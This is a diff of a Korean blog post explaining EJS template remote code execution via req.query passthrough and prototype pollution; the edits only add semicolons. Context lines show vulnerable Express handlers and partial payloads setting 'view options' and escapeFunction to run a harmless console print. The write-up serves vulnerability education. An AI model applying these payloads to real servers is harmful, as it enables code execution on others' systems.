@@ -17,16 +17,16 @@ draft: false
 
 ```javascript
 app.get('/', (req, res) => {
-	res.render('index', req.query)
-})
+	res.render('index', req.query);
+});
 ```
 
 물론 위 코드를 사용하지 않고도, **EJS RCE**를 발생시킬 수 있는 방법이 있다. 심지어, 아래와 같은 코드에서도 **EJS RCE**가 발생한다.
 
 ```javascript
 app.get('/', (req, res) => {
-	res.render('index')
-})
+	res.render('index');
+});
 ```
 
 위 코드에서는 왜 **RCE**가 발생할까?라는 생각이 들 수 있다. JS는 **prototype**에 크게 의존하는 언어이다. 즉, **prototype**이 오염된다면, 이를 통해 **RCE**를 발생시킬 수 있다. 최신 릴리즈된 버전인 **EJS@3.1.10**에서도 위 취약점이 발생한다.
@@ -41,8 +41,8 @@ app.get('/', (req, res) => {
 
 ```javascript
 app.get('/', (req, res) => {
-	res.render('index', req.query)
-})
+	res.render('index', req.query);
+});
 ```
 
 위 코드에서 사용자가 입력한 **req.query**를 그대로 **render**에 넘겨주는 것을 볼 수 있다. 물론, **req.query**가 아니더라도 사용자가 입력한 값을 타입 검증 없이 넘겨주는 것은 위험하다.
@@ -67,9 +67,9 @@ http://localhost:3000/?id=2&settings[view options][client]=1&settings[view optio
 
 ```javascript
 app.post('/a', (req, res) => {
-	merge({}, req.body)
-	res.render('index', { foo: 'bar' })
-})
+	merge({}, req.body);
+	res.render('index', { foo: 'bar' });
+});
 ```
 
 이 취약점은, **prototype pollution**을 통해 발생한다. 즉, **prototype pollution**이 **RCE**까지 연결될 수 있는 것이다. 또한, **prototype pollution**으로 발생하는 취약점은 **EJS@3.1.10**에서 한 번 패치가 됐지만, 간단한 우회 방법을 통해서 **EJS@3.1.10**에서도 발생한다.
@@ -84,7 +84,7 @@ await r.post('/a', {
 			escapeFunction: `console.log;console.info("RCE!!!")`
 		}
 	}
-})
+});
 ```
 
 #### EJS <= 3.1.10 (작성일 기준)
@@ -99,7 +99,7 @@ await r.post('/a', {
 			}
 		}
 	}
-})
+});
 ```
 
 #### Note
